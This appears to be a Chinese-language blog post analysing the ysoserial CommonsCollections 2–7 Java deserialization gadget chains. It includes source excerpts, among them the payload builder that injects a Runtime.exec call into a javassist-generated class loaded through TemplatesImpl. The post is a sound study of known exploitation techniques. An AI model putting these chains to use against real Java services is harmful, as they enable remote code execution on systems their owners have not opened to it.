---
title: ysoserial-CommonCollections2-7
categories:
 - ysoserial
tags:
- ysoserial
- 反序列化
---

ysoserial-CommonCollections2-7利用链分析

# CommonCollections1-7条件限制

| 链                  | commons-collections版本 | jdk        |
| ------------------- | ----------------------- | ---------- |
| CommonsCollections1 | 3.1-3.2.1               | 1.8以前    |
| CommonsCollections2 | 4.0                     | 7u21及以前 |
| CommonsCollections3 | 3.1-3.2.1               | 7u21及以前 |
| CommonsCollections4 | 4.0                     | 7u21及以前 |
| CommonsCollections5 | 3.1-3.2.1               | 1.8        |
| CommonsCollections6 | 3.1-3.2.1               | 1.7,1.8    |
| CommonsCollections7 | 3.1-3.2.1               | 1.7,1.8    |

# CC-2

## 利用链

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */
```

## PriorityQueue

在commons-collections中找Gadget的过程，实际上可以简化为，找⼀条从 Serializable#readObject() ⽅法到 Transformer#transform()⽅法的调⽤链。

下面是PriorityQueue.readObject到 Transformer#transform()的链

* readObject:773, PriorityQueue (java.util)  
* heapify:713, PriorityQueue (java.util) 恢复队列中的顺序
* siftDown:667, PriorityQueue (java.util) 将大的元素下移
* siftDownUsingComparator:699, PriorityQueue (java.util) 使用comparator来比较元素大小
* compare:81, TransformingComparator (org.apache.commons.collections4.comparators) TransformingComparator 实现了 java.util.Comparator 接⼝，同时在compare中调用了transform

这里实际上可以套上cc1后半部分的链，但是yso中选用了一条不需要Transformer数组的链

## TemplatesImpl

这里推荐看Java安全漫谈13，我直接给结论

`TemplatesImpl#newTransformer()`可以加载字节码

在`ysoserial`中对其做了封装

`final Object templates = Gadgets.createTemplatesImpl(command);`

具体的实现方法其实是一样的

```java
public static Object createTemplatesImpl ( final String command ) throws Exception {
    if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
        return createTemplatesImpl(
            command,
            Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
            Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
            Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
    }

    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
}


public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
    final T templates = tplClass.newInstance();

    // use template gadget class
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    pool.insertClassPath(new ClassClassPath(abstTranslet));
    
    //用javassist构造恶意类
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    // run command in static initializer
    // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
        command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
        "\");";
    clazz.makeClassInitializer().insertAfter(cmd);
    // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
    // TemplatesImpl加载的字节码对应的类必须是org.apache.xalan.internal.xsltc.runtime.AbstractTranslet的子类。
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);
    
    //恶意类转为字节
    final byte[] classBytes = clazz.toBytecode();

    // inject class bytes into instance
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
        //这里的Foo.class什么用暂且不清楚，里面就存了个serialVersionUID
        classBytes, ClassFiles.classAsBytes(Foo.class)
    });

    // required to make TemplatesImpl happy
    //_name 可以是任意字符串，只要不为null即可；
    Reflections.setFieldValue(templates, "_name", "Pwnr");
    //_tfactory 需要是一个 TransformerFactoryImpl 对象
    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
    return templates;
}
```

接下来要在利用链中调用`templates.newTransformer()`

回到前面的`TransformingComparator.compare`

```java
public int compare(I obj1, I obj2) {
    O value1 = this.transformer.transform(obj1);
    O value2 = this.transformer.transform(obj2);
    return this.decorated.compare(value1, value2);
}
```

这里的`this.transformer`可控，可以在构造时赋值，

`obj1`可控，即Queue中的元素

于是乎，这里用`InvokerTransformer`作为`this.transformer`，

`InvokerTransformer`的`iMethodName`属性设置为`newTransformer`

`templates`作为`obj1`

即可调用`templates.newTransformer()`加载恶意类

# CC-3

## 利用链

```
/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
```

前面和cc1一样就不说了，看看这边是怎么加载恶意类的

### InstantiateTransformer

```java
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                    new Class[] { Templates.class },
                    new Object[] { templatesImpl } )};
```

InstantiateTransformer.class

```java
public Object transform(Object input) {
    try {
        if (!(input instanceof Class)) {
            throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
        } else {
            // TrAXFilter.getConstructor(Templates.class)
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
        }
        ...
}
```

```java
public TrAXFilter(Templates templates)  throws
    TransformerConfigurationException
{
    _templates = templates;
    //这里调用了templates.newTransformer();最终加载了恶意类
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _useServicesMechanism = _transformer.useServicesMechnism();
}
```

# CC-4

## 利用链

```java
/*
 * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */
```

没啥好说的，组合利用

# CC-5

## 利用链

```java
/*
   Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()

   Requires:
      commons-collections
 */
```

```java
BadAttributeValueExpException val = new BadAttributeValueExpException(null);
Field valfield = val.getClass().getDeclaredField("val");
Reflections.setAccessible(valfield);
valfield.set(val, entry);

public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

这里直接给`val`赋值会执行`val.toString()`，所以用的反射

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

这里调用了`TiedMapEntry.toString()`，进一步调用了`getValue`，最后到了`LazyMap.get()`，之后就和CC1一样了

# CC-6

## 利用链

```java
/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()

    by @matthias_kaiser
*/
```

### HashSet

`HashSet.readObject()`

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in any hidden serialization magic
    s.defaultReadObject();

    // Read in HashMap capacity and load factor and create backing HashMap
    int capacity = s.readInt();
    float loadFactor = s.readFloat();
    map = (((HashSet)this) instanceof LinkedHashSet ?
           new LinkedHashMap<E,Object>(capacity, loadFactor) :
           new HashMap<E,Object>(capacity, loadFactor));

    // Read in size
    int size = s.readInt();

    // Read in all elements in the proper order.
    for (int i=0; i<size; i++) {
        E e = (E) s.readObject();
        map.put(e, PRESENT);
    }
}
```

这边`map.put(e, PRESENT);`往后调用了`e.hashcode()`，这里通过设置`hashset`的`key`，来使`e`为`TiedMapEntry`对象

```java
    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }

    public Object getValue() {
        return this.map.get(this.key);
    }
```

把`this.map`设置为`LazyMap`，后面就和cc-1一样了

# CC-7

## 利用链

```java
/*
    Payload method chain:

    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
```

### Hashtable

```java
private void reconstitutionPut(Entry<?,?>[] tab, K key, V value)
    throws StreamCorruptedException
{
    if (value == null) {
        throw new java.io.StreamCorruptedException();
    }
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = key.hashCode();
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<?,?> e = tab[index] ; e != null ; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) {
            throw new java.io.StreamCorruptedException();
        }
    }
    // Creates the new entry.
    @SuppressWarnings("unchecked")
        Entry<K,V> e = (Entry<K,V>)tab[index];
    tab[index] = new Entry<>(hash, key, value, e);
    count++;
}
```

`e.key.equals(key)`这里可以把`e.key`设置为`LazyMap`从而调用`LazyMap.get`

要注意的是要进入段代码，需要`Hashtable`中有一个以上的元素，，因为在第一次进入`reconstitutionPut`时，`tab`为空，在第一次调用的结尾`tab`将会被赋值，第二次进入`reconstitutionPut`时就可以调用`e.key.equals(key)`


# 参考

[1] [Java安全漫谈-反序列化篇](https://govuln.com/docs/java-things/)

[2] [玩转Ysoserial-CommonsCollection的七种利用方式分析](https://www.freebuf.com/vuls/214096.html)

